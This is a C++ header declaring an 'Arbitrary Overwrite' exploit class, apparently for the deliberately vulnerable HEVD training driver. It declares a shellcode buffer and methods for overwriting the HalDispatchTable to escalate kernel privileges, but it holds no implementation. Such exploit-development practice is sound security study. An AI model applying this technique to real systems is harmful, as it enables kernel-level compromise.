#pragma once

#include "common.h"
#include "IExploit.h"
#include "HevdConstants.h"

class ExploitArbitraryOverwrite : public IExploit {
	static constexpr wchar_t *Exploit_Name 	= L"Arbitrary Overwrite";
	static constexpr DWORD Ioctl_Code 		= HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE;
	static constexpr size_t Shellcode_Size 	= 128;
	
	shared_ptr<LPVOID> 	customPayload;
	DWORD				customPayloadSize;
	
public:
	ExploitArbitraryOverwrite(Driver& driver) : IExploit(driver), customPayload(0) {}
	virtual ~ExploitArbitraryOverwrite() {	}
	
	virtual const wchar_t* getName() const { 
		return ExploitArbitraryOverwrite::Exploit_Name;
	};
	
	virtual DWORD getIoctlCode() const {
		return ExploitArbitraryOverwrite::Ioctl_Code;
	}
	
	virtual bool exploit();
	
private:
	
	DWORD 	getHalDispatchTableAddr();
	LPVOID 	prepareCustomPayload(DWORD halDispatchTableRealAddr);
	bool 	invokeOverwrittenPointer();
};
